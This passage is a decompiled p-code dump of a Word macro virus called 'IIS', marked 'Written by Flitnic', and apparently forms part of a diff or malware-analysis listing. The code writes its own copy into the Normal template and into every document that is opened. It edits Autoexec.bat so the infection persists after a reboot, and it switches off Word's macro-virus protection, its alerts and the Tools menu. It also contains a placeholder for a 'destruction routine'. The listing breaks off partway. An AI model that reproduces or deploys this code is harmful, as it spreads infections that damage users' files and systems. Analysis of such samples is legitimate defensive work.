+' 	Ld VirCode 
+' 	LitStr 0x001B "Private Sub Document_Open()"
+' 	Eq 
+' 	LoopUntil 
+' Line #46:
+' 	Do 
+' Line #47:
+' 	Ld VirCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld ess 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St ess 
+' 	EndIf 
+' Line #48:
+' 	Ld ess 
+' 	LitDI2 0x0003 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo jump 
+' 	EndIf 
+' Line #49:
+' 	LitDI2 0x0001 
+' 	Ld VirCode 
+' 	LineInput 
+' Line #50:
+' 	Ld VirCode 
+' 	LitStr 0x0016 "Rem Written by Flitnic"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo jump 
+' 	EndIf 
+' Line #51:
+' 	Ld FullCode 
+' 	Ld VirCode 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St FullCode 
+' Line #52:
+' 	Loop 
+' Line #53:
+' 	Label jump 
+' Line #54:
+' 	Ld FullCode 
+' 	Ld VirCode 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St FullCode 
+' Line #55:
+' 	Ld FullCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Concat 
+' 	St FullCode 
+' Line #56:
+' 	Ld NormInstalled 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #57:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #58:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo AtrNo 
+' 	EndIf 
+' Line #59:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #60:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #61:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	IfBlock 
+' Line #62:
+' 	CloseAll 
+' Line #63:
+' 	LitStr 0x000F "c:\Autoexec.bat"
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #64:
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #65:
+' 	LitStr 0x000F "c:\Autoexec.bat"
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #66:
+' 	LitDI2 0x000C 
+' 	ArgsLd EOF 0x0001 
+' 	DoUnitil 
+' Line #67:
+' 	LitDI2 0x000C 
+' 	ArgsLd EOF 0x0001 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo ds 
+' 	EndIf 
+' Line #68:
+' 	LitDI2 0x000C 
+' 	Ld a 
+' 	LineInput 
+' Line #69:
+' 	Ld a 
+' 	LitStr 0x0013 "@del c:\normalb.dot"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo fv 
+' 	EndIf 
+' Line #70:
+' 	Loop 
+' Line #71:
+' 	Label ds 
+' Line #72:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	Paren 
+' 	Ld vbNormal 
+' 	ArgsCall SetAttr 0x0002 
+' Line #73:
+' 	LitStr 0x0000 ""
+' 	ParamNamed Template 
+' 	LitVarSpecial (False)
+' 	ParamNamed NewTemplate 
+' 	Ld Documents 
+' 	ArgsMemCall Add 0x0002 
+' Line #74:
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St Lines 
+' Line #75:
+' 	LitDI2 0x0001 
+' 	Ld Lines 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #76:
+' 	LitDI2 0x0001 
+' 	Ld FullCode 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #77:
+' 	LitStr 0x000E "C:\Normalb.dot"
+' 	ParamNamed FileName 
+' 	Ld wdFormatTemplate 
+' 	ParamNamed FileFormat 
+' 	LitVarSpecial (False)
+' 	ParamNamed AddToRecentFiles 
+' 	LitVarSpecial (False)
+' 	ParamNamed ReadOnlyRecommended 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0004 
+' Line #78:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #79:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #80:
+' 	LitStr 0x0009 "c:\No.dat"
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #81:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #82:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Close 0x0000 
+' Line #83:
+' 	LitStr 0x0009 "c:\No.dat"
+' 	ArgsCall Kill 0x0001 
+' Line #84:
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #85:
+' 	LitStr 0x000F "c:\autoexec.bat"
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #86:
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #87:
+' Line #88:
+' 	LitStr 0x000F "c:\Autoexec.bat"
+' 	LitStr 0x000F "c:\Autoexec.bak"
+' 	ArgsCall FileCopy 0x0002 
+' Line #89:
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #90:
+' 	LitStr 0x000F "c:\Autoexec.bat"
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #91:
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0018 "@Copy /y C:\normalb.dot "
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	Concat 
+' 	PrintItemNL 
+' Line #92:
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0013 "@del c:\normalb.dot"
+' 	PrintItemNL 
+' Line #93:
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0028 "@Copy /y c:\Autoexec.bak c:\Autoexec.bat"
+' 	PrintItemNL 
+' Line #94:
+' 	Label fv 
+' Line #95:
+' 	CloseAll 
+' Line #96:
+' 	ExitSub 
+' Line #97:
+' 	EndIfBlock 
+' Line #98:
+' 	Label AtrNo 
+' Line #99:
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St Lines 
+' Line #100:
+' 	LitDI2 0x0001 
+' 	Ld Lines 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #101:
+' 	LitDI2 0x0001 
+' 	Ld FullCode 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #102:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #103:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #104:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #105:
+' 	EndIfBlock 
+' Line #106:
+' 	Ld ActInstalled 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #107:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0003 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitStr 0x0001 "\"
+' 	Eq 
+' 	IfBlock 
+' Line #108:
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St Lines 
+' Line #109:
+' 	LitDI2 0x0001 
+' 	Ld Lines 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #110:
+' 	LitDI2 0x0001 
+' 	Ld FullCode 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #111:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #112:
+' 	ElseBlock 
+' Line #113:
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St Lines 
+' Line #114:
+' 	LitDI2 0x0001 
+' 	Ld Lines 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #115:
+' 	LitDI2 0x0001 
+' 	Ld FullCode 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #116:
+' 	EndIfBlock 
+' Line #117:
+' 	EndIfBlock 
+' Line #118:
+' 	Label esub 
+' Line #119:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St a 
+' Line #120:
+' 	Ld a 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #121:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #122:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #123:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #124:
+' 	CloseAll 
+' Line #125:
+' 	LitStr 0x0009 "c:\vn.dll"
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #126:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo tz2a 
+' 	EndIf 
+' Line #127:
+' 	LitStr 0x0009 "C:\vn.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #128:
+' 	Label tz2a 
+' Line #129:
+' 	LitStr 0x0009 "c:\vd.dll"
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #130:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo tz2b 
+' 	EndIf 
+' Line #131:
+' 	LitStr 0x0009 "C:\vd.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #132:
+' 	Label tz2b 
+' Line #133:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0003 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitStr 0x0001 "\"
+' 	Eq 
+' 	IfBlock 
+' Line #134:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #135:
+' 	EndIfBlock 
+' Line #136:
+' 	Ld windir 
+' 	LitStr 0x000F "\system\Log.drv"
+' 	Concat 
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #137:
+' 	LitDI2 0x0001 
+' 	ArgsLd LOF 0x0001 
+' 	St lll 
+' Line #138:
+' 	QuoteRem 0x0000 0x001E "IIS for NormalTemplate Create:"
+' Line #139:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #140:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #141:
+' 	LitVarSpecial (False)
+' 	St aAutoOpen 
+' Line #142:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #143:
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld Ii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St a 
+' Line #144:
+' 	Ld a 
+' 	LitStr 0x0009 "Sub IIS()"
+' 	Eq 
+' 	IfBlock 
+' Line #145:
+' 	Ld Ii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #146:
+' 	LitDI2 0x0001 
+' 	Ld cl 
+' 	Ld Ii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #147:
+' 	LitVarSpecial (True)
+' 	St aAutoOpen 
+' Line #148:
+' 	ExitFor 
+' Line #149:
+' 	EndIfBlock 
+' Line #150:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #151:
+' 	LitDI2 0x0000 
+' 	St Ii 
+' Line #152:
+' 	Ld aAutoOpen 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #153:
+' 	CloseAll 
+' Line #154:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #155:
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0014 "Attribute VB_Name = "
+' 	PrintItemSemi 
+' 	Ld XXXXX 
+' 	PrintItemSemi 
+' 	LitStr 0x0000 ""
+' 	PrintItemNL 
+' Line #156:
+' 	CloseAll 
+' Line #157:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	Paren 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemCall Import 0x0001 
+' Line #158:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #159:
+' 	EndIfBlock 
+' Line #160:
+' 	LitDI2 0x0000 
+' 	St iii 
+' Line #161:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #162:
+' 	Ld iii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #163:
+' 	Ld cl 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitFor 
+' 	EndIf 
+' Line #164:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #165:
+' 	LitStr 0x0009 "Sub IIS()"
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #166:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0012 "'Macro created by "
+' 	Concat 
+' 	Ld Application 
+' 	MemLd UserName 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #167:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #168:
+' 	LitDI2 0x0001 
+' 	Ld AutoOpenCode 
+' 	Ld iii 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #169:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #170:
+' Line #171:
+' 	QuoteRem 0x0000 0x001E "IIS for ActiveDocument Create:"
+' Line #172:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	ArgsLd LCase 0x0001 
+' 	LitStr 0x0001 "a"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo nomacro 
+' 	EndIf 
+' Line #173:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #174:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #175:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo nomacro 
+' 	EndIf 
+' Line #176:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0003 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitStr 0x0001 "\"
+' 	Eq 
+' 	IfBlock 
+' Line #177:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #178:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #179:
+' 	LitVarSpecial (False)
+' 	St aAutoOpen 
+' Line #180:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #181:
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld Ii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St a 
+' Line #182:
+' 	Ld a 
+' 	LitStr 0x0009 "Sub IIS()"
+' 	Eq 
+' 	IfBlock 
+' Line #183:
+' 	Ld Ii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #184:
+' 	LitDI2 0x0001 
+' 	Ld cl 
+' 	Ld Ii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #185:
+' 	LitVarSpecial (True)
+' 	St aAutoOpen 
+' Line #186:
+' 	ExitFor 
+' Line #187:
+' 	EndIfBlock 
+' Line #188:
+' 	StartForVariable 
+' 	Ld Ii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #189:
+' 	LitDI2 0x0000 
+' 	St Ii 
+' Line #190:
+' 	Ld aAutoOpen 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #191:
+' 	CloseAll 
+' Line #192:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #193:
+' 	LitDI2 0x0002 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0014 "Attribute VB_Name = "
+' 	PrintItemSemi 
+' 	Ld XXXXX 
+' 	PrintItemSemi 
+' 	LitStr 0x0000 ""
+' 	PrintItemNL 
+' Line #194:
+' 	CloseAll 
+' Line #195:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	Paren 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemCall Import 0x0001 
+' Line #196:
+' 	LitStr 0x000D "c:\newvnb.dll"
+' 	ArgsCall Kill 0x0001 
+' Line #197:
+' 	EndIfBlock 
+' Line #198:
+' 	LitDI2 0x0000 
+' 	St iii 
+' Line #199:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #200:
+' 	Ld iii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	St cl 
+' Line #201:
+' 	Ld cl 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitFor 
+' 	EndIf 
+' Line #202:
+' 	StartForVariable 
+' 	Ld iii 
+' 	EndForVariable 
+' 	NextVar 
+' Line #203:
+' 	LitStr 0x0009 "Sub IIS()"
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #204:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0012 "'Macro created by "
+' 	Concat 
+' 	Ld Application 
+' 	MemLd UserName 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #205:
+' 	Ld AutoOpenCode 
+' 	LitStr 0x0007 "End Sub"
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St AutoOpenCode 
+' Line #206:
+' 	LitDI2 0x0001 
+' 	Ld AutoOpenCode 
+' 	Ld iii 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #207:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #208:
+' 	EndIfBlock 
+' Line #209:
+' 	Label nomacro 
+' Line #210:
+' 	CloseAll 
+' Line #211:
+' 	Label MegaJump 
+' Line #212:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd Dir 0x0001 
+' 	St dd 
+' Line #213:
+' 	Ld dd 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #214:
+' 	OnError (Resume Next) 
+' Line #215:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	Ld vbReadOnly 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #216:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsLd GetAttr 0x0001 
+' 	St at 
+' Line #217:
+' 	Ld at 
+' 	LitDI2 0x0021 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St at 
+' 	EndIf 
+' Line #218:
+' 	Ld at 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo gghh 
+' 	EndIf 
+' Line #219:
+' 	Ld ormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #220:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt SaveNormalPrompt 
+' Line #221:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #222:
+' 	LitVarSpecial (False)
+' 	Ld Application 
+' 	MemSt DisplayStatusBar 
+' Line #223:
+' 	LitVarSpecial (False)
+' 	Ld Application 
+' 	MemSt DisplayAlerts 
+' Line #224:
+' 	LitVarSpecial (False)
+' 	LitDI2 0x0003 
+' 	LitDI2 0x000C 
+' 	LitStr 0x0005 "Tools"
+' 	Ld Application 
+' 	ArgsMemLd CommandBars 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	MemSt Visible 
+' Line #225:
+' Line #226:
+' 	QuoteRem 0x0000 0x0020 "Insert destruction routine here:"
+' Line #227:
+' Line #228:
+' 	Label gghh 
+' Line #229:
+' 	EndSub 
+' Line #230:
+' 	FuncDefn (Private Sub Document_Close())
+' Line #231:
+' 	Rem 0x000D " MyName = IIS"
+' Line #232:
+' 	LitStr 0x0009 "c:\No.dat"
+' 	ArgsLd Dir 0x0001 
+' 	St a 
+' Line #233:
+' 	Ld a 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0006 "NO.DAT"
+' 	Eq 
+' 	IfBlock 
+' Line #234:
+' 	ExitSub 
+' Line #235:
+' 	EndIfBlock 
+' Line #236:
+' 	CloseAll 
+' Line #237:
+' 	OnError MegaJump 
+' Line #238:
+' 	LitStr 0x000C "c:\msdos.sys"
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #239:
+' 	Do 
+' Line #240:
+' 	LitDI2 0x0001 
+' 	Ld ms 
+' 	LineInput 
+' Line #241:
+' 	Ld ms 
+' 	LitDI2 0x0007 
+' 	ArgsLd LBound 0x0002 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0007 "WINDIR="
+' 	Eq 
+' 	IfBlock 
+' Line #242:
+' 	Ld ms 
+' 	FnLen 
+' 	St a 
+' Line #243:
+' 	Ld ms 
+' 	LitDI2 0x0008 
+' 	Ld a 
+' 	ArgsLd Mid$ 0x0003 
+' 	St windir 
+' Line #244:
+' 	GoTo fert 
+' Line #245:
+' 	EndIfBlock 
+' Line #246:
+' 	Loop 
+' Line #247:
+' 	CloseAll 
+' Line #248:
+' 	Label fert 
+' Line #249:
+' 	CloseAll 
+' Line #250:
+' 	Ld windir 
+' 	LitStr 0x000F "\system\Log.drv"
+' 	Concat 
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #251:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0001 "+"
+' 	PrintItemNL 
+' Line #252:
+' 	CloseAll 
+' Line #253:
+' 	LitVarSpecial (False)
+' 	St NormInstalled 
+' Line #254:
+' 	LitVarSpecial (False)
+' 	St ActInstalled 
+' Line #255:
+' 	LitStr 0x0009 "c:\vn.dll"
+' 	Paren 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	ArgsMemCall Export 0x0001 
+' Line #256:
+' 	LitStr 0x0009 "c:\vd.dll"
+' 	Paren 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	ArgsMemCall Export 0x0001 
+' Line #257:
+' 	LitDI2 0x0002 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St NormInst 
+' Line #258:
+' 	LitDI2 0x0002 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St ActInst 
+' Line #259:
+' 	Ld NormInst 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0010 "REM MYNAME = IIS"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
